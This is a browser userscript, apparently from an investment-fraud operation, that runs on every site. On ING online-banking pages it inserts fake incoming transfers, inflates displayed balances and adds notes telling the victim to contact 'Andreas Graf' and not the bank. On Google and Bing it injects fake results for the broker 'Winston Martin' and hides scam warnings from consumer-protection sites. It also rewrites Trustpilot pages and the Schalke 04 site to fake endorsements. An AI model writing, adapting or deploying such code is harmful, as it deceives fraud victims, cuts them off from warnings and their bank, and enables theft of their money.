// ==UserScript==
// @name         Ed WM IN Johann Treu
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/495937/Ed%20WM%20IN%20Johann%20Treu.user.js
// @updateURL https://update.greasyfork.org/scripts/495937/Ed%20WM%20IN%20Johann%20Treu.meta.js
// ==/UserScript==


(function() {
    'use strict';

////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////

    // Specify the adjustment amount for topGesamtSaldo
    const topGesamtSaldoAdjustmentAmount = 19000;  // Change this to your desired amount

    // Define an array for account balance adjustments
    const accountBalanceAdjustments = [
        { index: 1, amount: 19000},  
        { index: 3, amount: 0},// Example: change the first account's balance by -1000 EUR
    //    { index: 2, amount: 100 },
        // Add more objects as needed for each account balance adjustment
    ];

    // Specify your IBAN and custom transactions here
    const yourIBAN = 'DE43 5001 0517 5801 9984 52'; // Replace with your IBAN
     // Specify the balance change you want to make (positive for increase, negative for decrease)
    const balanceChange = 19000.0; // Example: decrease balance by 100.00 EUR
    const customTransactions = [
        {
            recipientName: 'JP Morgan Chase',
            transactionDetails: 'Treuhand: Freigabe nötig. An Andreas Graf wenden, nicht die Bank, damit nicht gesperrt wird.',
            transactionAmount: '+137.187,29',
            moveDirection: 'down',
            moveSteps: 0,
            transactionDate: '14.09.2023',
            insertAtTop: true
        },
       
   {
           recipientName: 'JP Morgan Chase',
           transactionDetails: 'Geld für Steuern. Nur an Andreas Graf',
            transactionAmount: '+19.000,00',
           moveDirection: 'down',
          moveSteps: 0,
           transactionDate: '14.09.2023',
           insertAtTop: true
       },





        // Add more transactions as needed
    ];

////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
/////////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// /////////
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////

     if (window.location.href.indexOf("ing.de") > 0 || window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("drive") > 0) {

 // Add overlay and spinner when the webpage is loading
    var overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'white';
    overlay.style.zIndex = '9999';
    document.body.appendChild(overlay);

    var spinner = document.createElement('div');
    spinner.className = 'spinner';
    overlay.appendChild(spinner);

    var overlayDuration = 1500;
    setTimeout(function() {
        overlay.remove();
    }, overlayDuration);

    // Add CSS for the spinner
    var style = document.createElement('style');
    style.textContent = `
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #333;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10000;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    `;
    document.head.appendChild(style);

// Classes to monitor and remove
const classesToRemove = [
    'g2p-transaction__nav-container',
    'g2p-transaction__title-wrap',
    'g2p-transaction__overview-info.u-hidden-sm',
    'gap-top-1.gap-bottom-1-sm',
    'g2p-extend-toggle',
    'quicklinks',
    'g2p-transaction-summary__balance',
    'accountselector.accountselector--g2p.accountselector--iban',
    'button-text-indigo', // Added class to remove
    'link-icon', // Added class to remove
    'link-icon--print' // Added class to remove
    /* ... */
];

// Function to remove elements with specific classes
function removeElementsWithClasses() {
    classesToRemove.forEach(className => {
        const elements = document.querySelectorAll('.' + className);
        elements.forEach(element => {
            element.remove();
        });
    });
}

// Mutation Observer to monitor and remove elements
const observer = new MutationObserver(mutations => {
    removeElementsWithClasses();
});

// Configuration for the observer
const observerConfig = {
    attributes: true, // Monitor attribute changes
    childList: true, // Monitor additions/removals of child nodes
    subtree: true // Observe all descendants of target node
};

// Start observing the document
observer.observe(document.body, observerConfig);

}




        if (window.location.href.indexOf("umsatzanzeige") > 0 || window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("drive") > 0) {





    // Transaction Insertion Script Logic
    window.addEventListener('load', function() {
        const ibanElement = document.querySelector('.g2p-banking-header__account__iban');

        if (ibanElement) {
            const specifiedIBAN = yourIBAN.replace(/\s+/g, '');
            const retrievedIBAN = ibanElement.textContent.trim().replace(/\s+/g, '');

            if (retrievedIBAN === specifiedIBAN) {
                customTransactions.forEach(transaction => {
                    const {
                        recipientName,
                        transactionDetails,
                        transactionAmount,
                        moveDirection,
                        moveSteps,
                        transactionDate,
                        insertAtTop
                    } = transaction;

                    const transactionAmountClass = parseFloat(transactionAmount) < 0
                        ? 'g2p-transaction-summary__amount g2p-transaction-summary__amount--negative'
                        : 'g2p-transaction-summary__amount g2p-transaction-summary__amount--positive';

                    const newTransactionElement = document.createElement('div');
                    newTransactionElement.className = 'g2p-transaction-item';
                    newTransactionElement.innerHTML = `
                        <div class="g2p-transaction-overlay__header">
                            <div class="g2p-transaction-overlay__close"></div>
                        </div>
                        <div class="g2p-transaction-summary g2p-transaction-summary--notags">
                            <div class="g2p-transaction-summary__primary">
                                <div class="g2p-transaction-summary__recipient">
                                    <span>${recipientName}</span>
                                </div>
                                <span class="g2p-transaction-summary__type">${transactionDetails}</span>
                            </div>
                            <div class="g2p-transaction-summary__balance">
                                <span class="u-visuallyhidden">Kontosaldo nachher:</span>
                            </div>
                            <span class="${transactionAmountClass}">
                                <span class="u-visuallyhidden">Summe:</span>
                                <span class="g2p-amount">${transactionAmount}&nbsp;€</span>
                            </span>
                        </div>
                        <button class="g2p-transaction-details-btn"
                                aria-label="Umsatzdetails anzeigen für: ${recipientName}. Umsatzart: ${transactionDetails}. Summe: ${transactionAmount} Euro."
                                data-toggle-selector="#idb960f76b"
                                data-toggle-state="open,closed"
                                data-trigger-state="closed"
                                aria-expanded="false"></button>
                        <div class="g2p-transaction-details" data-state="closed" data-animate="" data-lazy-loading="true"
                             aria-hidden="true">
                        </div>
                    `;

                   if (insertAtTop) {
                    const firstTransactionGroup = document.querySelector('.g2p-transaction-group');
                    if (firstTransactionGroup) {
                        firstTransactionGroup.parentNode.insertBefore(newTransactionElement, firstTransactionGroup);
                        moveTransaction(newTransactionElement, moveDirection, moveSteps);
                    } else {
                        console.error('No transaction group found.');
                    }
                } else {
                        const transactionGroups = document.querySelectorAll('.g2p-transaction-group__title');
                        let targetGroup = null;

                        transactionGroups.forEach(group => {
                            if (group.textContent.trim() === transactionDate) {
                                targetGroup = group.closest('.g2p-transaction-group');
                            }
                        });


               if (!targetGroup) {
                            let closestDiff = Infinity;
                            transactionGroups.forEach(group => {
                                const groupDate = group.textContent.trim();
                                const currentDate = new Date(transactionDate);
                                const groupDiff = Math.abs(currentDate - new Date(groupDate));
                                if (groupDiff < closestDiff) {
                                    closestDiff = groupDiff;
                                    targetGroup = group.closest('.g2p-transaction-group');
                                }
                            });
                        }

                        if (targetGroup) {
                        targetGroup.querySelector('.g2p-transaction-list').appendChild(newTransactionElement);
                        moveTransaction(newTransactionElement, moveDirection, moveSteps);
                    } else {
                        console.error('No suitable transaction group found.');
                    }
                }
            });

                // Balance Change Logic from Transaction Insertion Script

                const balanceElement = document.querySelector('.g2p-banking-header__account__balance .g2p-amount');


                 if (balanceElement) {
                    const currentBalanceText = balanceElement.textContent.trim();
                    const currentBalance = parseFloat(currentBalanceText.replace(/\./g, '').replace(',', '.').replace(/ /g, '').replace('€', ''));
                    const newBalance = currentBalance + balanceChange;
                    const newBalanceFormatted = newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2, style: 'currency', currency: 'EUR' });
                    balanceElement.innerHTML = newBalanceFormatted;
                } else {
                    console.error('Balance element not found.');
                }
            } else {
                console.error('IBAN does not match.');
            }
        } else {
            console.error('IBAN element not found.');
        }
    });
    // Move Transaction Function
    function moveTransaction(transactionElement, moveDirection, moveSteps) {
        const transactionList = transactionElement.parentNode;
        const transactionSiblings = Array.from(transactionList.children);

        const currentIndex = transactionSiblings.indexOf(transactionElement);

        if (moveDirection === 'up') {
            const newIndex = Math.max(currentIndex - moveSteps, 0);
            transactionList.insertBefore(transactionElement, transactionSiblings[newIndex]);
        } else if (moveDirection === 'down') {
            const newIndex = Math.min(currentIndex + moveSteps, transactionSiblings.length - 1);
            transactionList.insertBefore(transactionElement, transactionSiblings[newIndex].nextSibling);
        } else {
            console.error('Invalid move direction. Please specify "up" or "down".');
        }
    }
            }


      if (window.location.href.indexOf("obligo/obligo") > 0 || window.location.href.indexOf("drive") > 0) {



    // Find the topGesamtSaldo balance element by its class name
    const topGesamtSaldoBalanceElement = document.querySelector('.g2p-banking-header__balance.g2p-amount');

    if (topGesamtSaldoBalanceElement) {
        // Parse and adjust the current topGesamtSaldo balance
        const currentTopGesamtSaldoText = topGesamtSaldoBalanceElement.textContent.trim();
        const currentTopGesamtSaldo = parseFloat(currentTopGesamtSaldoText.replace(/\./g, '').replace(',', '.').replace(/ /g, '').replace('€', ''));
        const newTopGesamtSaldo = currentTopGesamtSaldo + topGesamtSaldoAdjustmentAmount;

        // Format the new topGesamtSaldo balance
        const newTopGesamtSaldoFormatted = newTopGesamtSaldo.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2, style: 'currency', currency: 'EUR' });

        // Update the topGesamtSaldo balance element's content with the new formatted balance
        topGesamtSaldoBalanceElement.textContent = newTopGesamtSaldoFormatted;
    } else {
        console.error('Topgesamtsaldo balance element not found.');
    }

    // Loop through the account balance adjustments array
    for (const adjustment of accountBalanceAdjustments) {
        const accountBalanceElement = document.querySelectorAll('.g2p-account__balance.g2p-amount')[adjustment.index];

        if (accountBalanceElement) {
            const currentAccountBalanceText = accountBalanceElement.textContent.trim();
            const currentAccountBalance = parseFloat(currentAccountBalanceText.replace(/\./g, '').replace(',', '.').replace(/ /g, '').replace('€', ''));
            const newAccountBalance = currentAccountBalance + adjustment.amount;

            const newAccountBalanceFormatted = newAccountBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2, style: 'currency', currency: 'EUR' });

            accountBalanceElement.textContent = newAccountBalanceFormatted;
        } else {
            console.error(`Account balance element at index ${adjustment.index} not found.`);
        }
    }
            }



 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "winston", "martin", "winston martin", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.winstonmartin.com/",
                                title: "Winston Martin dein Broker",
                                description: "Winston Martin ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.winstonmartin.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Winston Martin - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Winston Martin",
                                footerText: "https://de.trustpilot.com/review/winstonmartin.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Winston Martin Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Winston Martin ab dem 1. Januar unser Sponsor und Partner wird. Winston Martin ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Winston Martin sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Winston Martin";
    const customLogoURL = "https://p-cdn.co/winstonmartin/brands/winstonmartin/logo-white.png";
    const customURL = "https://cfd.winstonmartin.com/";
    const customReferenceURL = "winstonmartin.com";
    const customLinkURL = "https://cfd.winstonmartin.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Winston Martin",
      "icmarkets": "Winston Martin",
      "ic-markets": "Winston Martin",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.winstonmartin.com/";
var newLogoURL = "https://i.ibb.co/wRWGRKf/Copy-of-Untitled-Design-1.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }




})();
